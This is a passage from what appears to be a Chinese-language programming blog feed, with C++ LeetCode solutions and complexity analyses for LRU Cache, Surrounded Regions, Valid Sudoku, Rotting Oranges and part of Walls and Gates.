Cache 中，則一樣需要將該值進行更新，這裡一樣宣告一個指標來存取該節點 (<code>Node *node = cacheMap[key]</code>) 並且更新該節點的值 (<code>node-&gt;value = value</code>)然後因為有存取行為，所以還是要將該節點移動到 front (<code>moveToFront(node)</code>)。</p><p>然而如果要插入的Key-value pair 不存在於 cache中，就需要去建立新的節點 (<code>Node *newData = new Node(key, value)</code>)  然而再插入節點前需要先檢查Cache 容量是否足夠，一旦到達容量上限就需要去騰出空間，需要將最少使用的資料逐出 (<code>removeTail();</code>)，另一種狀況是今天Cache 是空的，要被插入的資料會是第一筆資料，這時候就需要將 <code>front</code> 跟 <code>tail</code> 更新為 <code>newData</code> 其餘多節點的狀況就比較單純了，需要將新資料差入到 front ，所以新資料的 <code>next</code> 需要指向當前得 <code>front</code> 然後當前 <code>front</code> 的前一個節點要指向新插入資料 （<code> front-&gt;prev = newData;</code>） 最後再將新資料更新為新的 <code>front</code> 。此外也需要將將 Hash Table 添加新資料  <code>cacheMap[key] = newData;</code>。</p><blockquote><p>這樣就完成了一套基本的 LRU 系統</p></blockquote><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/146/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><table><thead><tr><th>方法</th><th>時間複雜度</th><th>空間複雜度</th><th>複雜度分析說明</th></tr></thead><tbody><tr><td><code>get</code></td><td>$O(1)$</td><td>$O(1)$</td><td>使用Hash Table（<code>unordered_map</code>）透過鍵直接存取對應節點，實現常數時間的操作</td></tr><tr><td><code>put</code></td><td>$O(1)$</td><td>$O(1)$</td><td>新增與刪除操作均透過哈希表與雙向鏈表完成，每次插入或刪除節點的操作時間為常數級別</td></tr><tr><td>總體</td><td>$O(1)$</td><td>$O(n)$</td><td>Hash Table儲存鍵值對，雙向鏈表用於維護最近使用順序，空間複雜度與緩存容量成正比</td></tr></tbody></table><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Linked List </tag>
            
            <tag> Hash Table </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>包圍的區域 | Medium | LeetCode#130. Surrounded Regions</title>
      <link href="/posts/51295e83.html"/>
      <url>/posts/51295e83.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/130/question.jpeg"></p><ul><li>題目難度： <code>Medium</code></li><li>題目描述： 給定一個 <code>m x n</code> 大小的 <code>board</code>，包含兩種字母 <code>X</code> 或者 <code>O</code>，目的是捕捉被包圍的區域：</li></ul><div class="note info flat"><p><strong>Connected：</strong> 一個格子可以與相鄰的格子（水平或垂直）相連<br><strong>Region：</strong> 通過連接每個 <code>O</code> 格子來形成一個區域(Region)<br><strong>Surround：</strong> 如果一個區域的所有 <code>O</code> 格子都能被 <code>X</code> 格子連接，並且該區域中的 <code>O</code> 格子不在矩陣的邊緣上，則該區域被視為被包圍</p></div><blockquote><p>題目要捕捉被包圍的區域， <strong>將原始矩陣中所有被包圍的 <code>O</code> 替換為 <code>X</code>。</strong>  此操作應直接在原始矩陣上進行，無需返回任何值。</p></blockquote><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>這題我一開始的想法有點偏掉，但這題的意思就是：</p><ol><li>找出被包圍 Region 並將 Region 中的 <code>O</code> 換成 <code>X</code></li><li>如果 Region 有接到矩陣邊緣，則不替換成 <code>X</code></li></ol><p>這樣依舊會需要先透過 DFS 或者是 BFS 來先去走訪 connected components (相連的 <code>O</code>) 這裡可以透過 <strong>先從邊緣查找是否有 <code>O</code>，如果有作爲起點進行 DFS， 找到的Connected components 這都代表是不能轉換成 <code>X</code> 的區域</strong> ，可以先替換成其他符號，之後再走訪一次 <code>board</code> 將轉換成 其他符號的區域變回來，然後將還是 <code>O</code> 的區域轉換成 <code>X</code></p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; board, <span class="type">int</span> row, <span class="type">int</span> col)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(row &lt; <span class="number">0</span> || row &gt;= board.<span class="built_in">size</span>() || col &lt; <span class="number">0</span> || col &gt;= board[<span class="number">0</span>].<span class="built_in">size</span>() || board[row][col] != <span class="string">&#x27;O&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">        </span><br><span class="line">        board[row][col] = <span class="string">&#x27;T&#x27;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> offsetRow[<span class="number">4</span>] = &#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="type">int</span> offsetCol[<span class="number">4</span>] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++)&#123;</span><br><span class="line">        <span class="built_in">dfs</span>(board ,row+offsetRow[k], col+offsetCol[k]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; board)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//Traverse the board</span></span><br><span class="line">        <span class="type">int</span> m = board.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = board[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//Handle boundary</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> row=<span class="number">0</span>; row&lt; m; row++)&#123;</span><br><span class="line">            <span class="comment">// Find connected components connected to boundary</span></span><br><span class="line">            <span class="keyword">if</span>(board[row][<span class="number">0</span>] == <span class="string">&#x27;O&#x27;</span>) <span class="built_in">dfs</span>(board, row, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span>(board[row][n<span class="number">-1</span>] == <span class="string">&#x27;O&#x27;</span>) <span class="built_in">dfs</span>(board, row, n<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> col=<span class="number">0</span>; col &lt;n ; col++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(board[<span class="number">0</span>][col] == <span class="string">&#x27;O&#x27;</span>) <span class="built_in">dfs</span>(board, <span class="number">0</span>, col);</span><br><span class="line">            <span class="keyword">if</span>(board[m<span class="number">-1</span>][col] == <span class="string">&#x27;O&#x27;</span>) <span class="built_in">dfs</span>(board, m<span class="number">-1</span>, col);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> row=<span class="number">0</span>; row&lt; m; row++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> col=<span class="number">0</span>; col &lt; n; col++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(board[row][col] == <span class="string">&#x27;O&#x27;</span>)&#123;</span><br><span class="line">                    board[row][col] = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (board[row][col] == <span class="string">&#x27;T&#x27;</span>)&#123;</span><br><span class="line">                    board[row][col] = <span class="string">&#x27;O&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡宣告的 <code>dfs</code> 的終止條件會是當當前的 row 或 col 超出陣列範圍，或者當前的格子已經不是 <code>O</code> ，則返回。而在每一格會去將 <code>O</code> 變更為 <code>T</code>， <strong>這是因為這個 dfs 只用來在以 <code>board</code> 邊緣為起點時才會需要</strong> ，因此走訪的 <code>O</code> 都是不可轉換成 <code>X</code> 的，因此轉成一個不相干的字母 <code>T</code>。 而在函數 <code>solve</code> 中會先迭代 <code>board</code> 的四個邊緣，如果發現有 <code>O</code> 就作為搜尋起點進行走訪，四個邊都走訪完畢後，接著透過雙層迴圈迭代 <code>board</code> 查找每一格中剩餘的 <code>O</code> 這剩餘的 <code>O</code> 就會是要替換成 <code>X</code> 的格子。而 <code>board</code> 中的所有 <code>T</code> 都要轉換回 <code>O</code>。 這樣就能夠成功包圍出有效的 region。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/130/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度</p><p>$O(m \times n)$</p><p>空間複雜度</p><p>$O(m \times n)$ </p><p>最壞情況下，DFS 可能會遞迴訪問矩陣中的每個 <code>O</code>，因此遞迴調用棧的深度最多為矩陣中 <code>O</code> 的數量<br>假設矩陣中所有元素都是 <code>O</code>，則遞迴Stackk的空間複雜度為 $O(m \times n)$ </p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Graph </tag>
            
            <tag> DFS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有效的數獨 | Medium | LeetCode#36. Valid Sudoku</title>
      <link href="/posts/e10f7c64.html"/>
      <url>/posts/e10f7c64.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/36/question1.jpeg"></p><p><img src="/img/LeetCode/36/question2.jpeg"></p><ul><li>題目難度： <code>Medium</code></li><li>題目描述： 給定一個 <code>9 x 9</code> 大小的數獨 <code>board</code>  請確認該數獨是否是有效的。</li></ul><div class="note info flat"><p>只有當被填入數字滿足下面條件，數獨才會是有效的:<br>(1) 每一列只包含非重複的數字 <code>1-9</code><br>(2) 每一行只包含非重複的數字 <code>1-9</code><br>(3) 共9個 <code>3 x 3</code> 的子方格, 每個子方格中的數字 <code>1-9</code> 都不重複</p></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>想法就偏向暴力解，首先就是要迭代 <code>board</code> 中每一列，看數字是否重複，這時可以用一個 <code>unordered_set</code> 去儲存數字，並在每一格檢查數字是否重複，如果重複就回傳 false，接著迭代每一行檢查是否重複。每次換行換列 <code>unordered_set</code> 都要清空為的是保存新的一行&#x2F;列的數字。 最後就是需要迭代 9 個 <code>3*3</code> 大小的子方格，如果重複就回傳 false 函數最後代表檢查完畢，回傳 true。</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isValidSudoku</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; board)</span></span>&#123;</span><br><span class="line">        unordered_set&lt;<span class="type">char</span>&gt; uset;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;board.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;board[<span class="number">0</span>].<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(board[i][j]!= <span class="string">&#x27;.&#x27;</span> )&#123;</span><br><span class="line">                    <span class="keyword">if</span>(uset.<span class="built_in">find</span>(board[i][j])!= uset.<span class="built_in">end</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">else</span> uset.<span class="built_in">insert</span>(board[i][j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            uset.<span class="built_in">clear</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        uset.<span class="built_in">clear</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;board[<span class="number">0</span>].<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;board.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(board[i][j]!= <span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(uset.<span class="built_in">find</span>(board[i][j])!= uset.<span class="built_in">end</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">else</span> uset.<span class="built_in">insert</span>(board[i][j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            uset.<span class="built_in">clear</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        uset.<span class="built_in">clear</span>();</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">3</span>; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt; <span class="number">3</span>;j++ )&#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> row=i*<span class="number">3</span>; row &lt; i*<span class="number">3</span>+<span class="number">3</span>; row++)&#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> col = j*<span class="number">3</span>; col&lt;j*<span class="number">3</span>+<span class="number">3</span>; col++)&#123;</span><br><span class="line">                        <span class="keyword">if</span> (board[row][col] != <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(uset.<span class="built_in">find</span>(board[row][col])!=uset.<span class="built_in">end</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                            <span class="keyword">else</span> uset.<span class="built_in">insert</span>(board[row][col]);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                uset.<span class="built_in">clear</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        uset.<span class="built_in">clear</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>實際操作上也跟想像上的一樣，分成三部分：檢查行、檢查列、檢查方格。其中也有宣告一個 <code>unordered_set uset</code> 來去為每一行&#x2F;列保存數字。每一行&#x2F;列結束後也會清空 <code>uset.clear()</code>。 只有最後在迭代子方格的時候需要注意，最外層兩格迴圈代表依序選擇不同的子方格去迭代，內部兩層迴圈則是迭代子方格內部，一但發現重複數字，就回傳 false，另外在每次迭代完子方格後，<code>uset</code> 要清空。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/36/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度</p><p>$O(1)$：棋盤一共 9 x 9 格，每一格進行檢查或插入的行為為 $O(1)$ 因此一共會是 $O(81)$ 為常數時間複雜度，因此整體會是 $O(1)$</p><p>空間複雜度</p><p>$O(1)$: 每次進行檢查完畢後 <code>unordered_set</code> 都會清空，因此整體會是 $O(1)$</p><blockquote><p>但如果今天不是固定棋盤，而是 $n \times n$ 則時間複雜度會上升為 $O(n^2)$</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Hash Table </tag>
            
            <tag> Matrix </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>腐爛中的橘子 | Medium | LeetCode#994. Rotting Oranges</title>
      <link href="/posts/873eb125.html"/>
      <url>/posts/873eb125.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/994/question.jpeg"></p><ul><li>題目難度： <code>Medium</code></li><li>題目描述： 給定一個 <code>m x n</code> 大小的矩陣叫做 <code>grid</code> ，其中每一格可能會這三種值其中一種： (1) <code>0</code> 代表那格是空的 (2) <code>1</code> 代表新鮮橘子 (2) <code>2</code> 代表腐爛橘子。每分鐘在腐爛橘子四周的(上下左右)其他新鮮橘子都會腐爛，請回傳整個 <code>grid</code> 中所有新鮮橘子都腐爛最少需要幾分鐘，如果不可能全都腐爛，則回傳 <code>-1</code></li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>我原先認為這題就是要將腐爛橘子作為搜尋起點，然後BFS走訪附近的新鮮橘子，並且計算距離，每多走一格就會變成腐爛橘子，最後回傳最小距離就好。但後來發現這樣不符合題意，因為題目的要求是每一分鐘腐爛過子四周的新鮮橘子也會變腐爛，原先的做法會忽略了 <strong>「一輪 BFS 表示一分鐘」的關鍵邏輯。</strong> 腐蝕的時間應該是按 <strong>層數</strong>來計算，而非單純依照單一節點的距離。並且在BFS結束後，可能還是會有新鮮橘子存在(可能是分隔在其他cell中)， <strong>所以為了判斷最後是否還有新鮮橘子存在，需要一個變數再一開始就紀錄有多少新鮮橘子，並且在BFS走訪過程，每經過一層，就會將路過的新鮮橘子數量扣除。這樣最後就能判斷是否還有剩新鮮橘子</strong></p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">orangesRotting</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> m = grid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> minute = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> freshCount = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> offsetRow[<span class="number">4</span>] = &#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="type">int</span> offsetCol[<span class="number">4</span>] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;;</span><br><span class="line">        queue&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt; q;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;n; j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(grid[i][j] == <span class="number">2</span>)&#123;</span><br><span class="line">                    q.<span class="built_in">push</span>(&#123;i,j&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(grid[i][j]==<span class="number">1</span>)&#123;</span><br><span class="line">                    freshCount++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>() &amp;&amp; freshCount &gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="type">int</span> size = q.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>; i&lt; size;i++)&#123;</span><br><span class="line">                    pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt; current = q.<span class="built_in">front</span>();</span><br><span class="line">                    q.<span class="built_in">pop</span>();</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>; k&lt;<span class="number">4</span>; k++)&#123;</span><br><span class="line">                        <span class="type">int</span> subRow = current.first + offsetRow[k];</span><br><span class="line">                        <span class="type">int</span> subCol = current.second + offsetCol[k];</span><br><span class="line">            </span><br><span class="line">                        <span class="keyword">if</span>(subCol &gt;=<span class="number">0</span> &amp;&amp; subCol &lt; n &amp;&amp; subRow &gt;=<span class="number">0</span> &amp;&amp; subRow &lt; m &amp;&amp; grid[subRow][subCol]==<span class="number">1</span>)&#123;</span><br><span class="line">                            grid[subRow][subCol]=<span class="number">2</span>;</span><br><span class="line">                            freshCount--;</span><br><span class="line">                            q.<span class="built_in">push</span>(&#123;subRow,subCol&#125;);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        minute++;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> freshCount == <span class="number">0</span> ? minute : <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這題跟 <a href="https://leozzmc.github.io/posts/79e94c86.html">LeetCode#286. Walls and Gates</a> 很像，一樣先把符合條件的搜尋起點 Push 進入 queue中 (<code>q.push(&#123;i,j&#125;);</code>) ，這裏也順便紀錄新鮮橘子的數量 (<code>freshCount</code>)，接著就是要以腐爛橘子作為起點來進行BFS，同時如果已經沒有新鮮橘子的話 BFS就可停止 (<code>while(!q.empty() &amp;&amp; freshCount &gt; 0)</code>) ，這裡有個關鍵，<strong>每分鐘腐爛橘子的四周都會變腐爛</strong> ， 這就代表若要將新鮮橘子更新為腐爛橘子，會需要以 Level 來進行，這裡可以回想成以前樹的 Level-Order Traversal，而每往下一層就會腐爛，意思是一樣的，只不過這裡會是Graph。腐蝕的時間應該是按層數來計算，因此我們透過變數 <code>size</code> 來保存這一層vertex數量，然後依序去作為搜尋起點找四周的新鮮橘子，如果四周節點在 <code>grid</code> 範圍內並且為新鮮橘子 (<code>grid[subRow][subCol]==1</code>) 則將該橘子更新為腐爛橘子 <code>grid[subRow][subCol]=2;</code> 並且減少 <code>freshCount</code> 數量，然後將腐爛橘子push 進入 queue 作為下一層的搜尋起點。 每一層搜尋結束後，都會多一分鐘，因此需要更新 <code>minute</code>。 函數的最後如果還有新鮮橘子則回傳 <code>-1</code> 如果沒有則回傳 <code>minute</code>。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/994/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度</p><p>$O(m \times n)$ &#x3D; $O(m \times n)$ + $O(m \times n)$ </p><p>$m \times n$ 為 <code>grid</code> 大小， 另外最壞狀況下 queue中可能會有 $m \times n$ 個節點要處理，因此整體複雜度為 $O(m \times n)$</p><p>空間複雜度</p><p>$O(m \times n)$ queue 最糟糕狀況可能同時儲存 $m \times n$ 個節點</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Graph </tag>
            
            <tag> BFS </tag>
            
            <tag> Queue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>牆壁與閘門 | Medium | LeetCode#286. Walls and Gates</title>
      <link href="/posts/79e94c86.html"/>
      <url>/posts/79e94c86.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/286/question.jpeg"></p><ul><li>題目難度：<code>Medium</code></li><li>題目描述： 給定一個 <code>m x n</code> 大小的網格 <code>rooms</code> 並且可能初始化三種值：(1) <code>-1</code> 代表牆壁或者障礙物 (2) <code>0</code> 代表閘門 (3) <code>INF</code> 則代表空房間，這裏的 <code>INF</code> 代表 <code>2^31 - 1 = 2147483647</code> (整數的上界)，其實就想成是房間到閘門的距離初始化無限大。 本提要求將空房間填入距離他最近閘門的距離值。</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>這裡其實也是要求從圖中的閘門當成搜尋起點，來去進行路徑走訪，將所有路過的空房間都標注與閘門的距離，所以要做的事會是 BFS 走訪。只不過在 BFS 發現新的 Connected Vertex 的時候會需要將其標注上與搜尋起點(閘門)的距離</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td 